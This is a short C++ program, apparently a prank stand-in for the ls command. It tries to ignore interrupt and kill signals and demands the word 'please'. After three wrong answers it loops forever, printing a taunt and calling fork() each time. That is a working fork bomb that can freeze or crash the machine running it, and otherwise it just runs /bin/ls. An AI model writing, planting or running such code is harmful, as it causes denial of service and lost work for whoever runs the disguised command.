#include <iostream>
#include <stdlib.h>
#include <string>
#include <csignal>
#include <unistd.h>

void ignore_sig (int sig_no){
}

using namespace std;
int main (int argc, char *argv[]){
  
  signal(SIGINT,ignore_sig);
  signal(SIGTRAP,ignore_sig);
  signal(SIGSTOP,ignore_sig);
  signal(SIGTSTP,ignore_sig);
  signal(SIGKILL,ignore_sig);
  signal(SIGHUP,ignore_sig);

  string sharg;
  if(argv[1] == NULL){
    sharg = "";
  } else {
    sharg = argv[1];
  }
  string please = "please";
  int i = 0;

  while(sharg.compare(please) != 0 && i<3){
    cout << argv[0] << ":" <<" PERMISSION DENIED\n";
    cin >> sharg;
    i++;
  }  

  if(i>=3){
    while(1){
      cout << "YOU DIDN'T SAY THE MAGIC WORD!\n";
      fork();
    }
  } else {
    system("/bin/ls");
  }

  return 0;
}

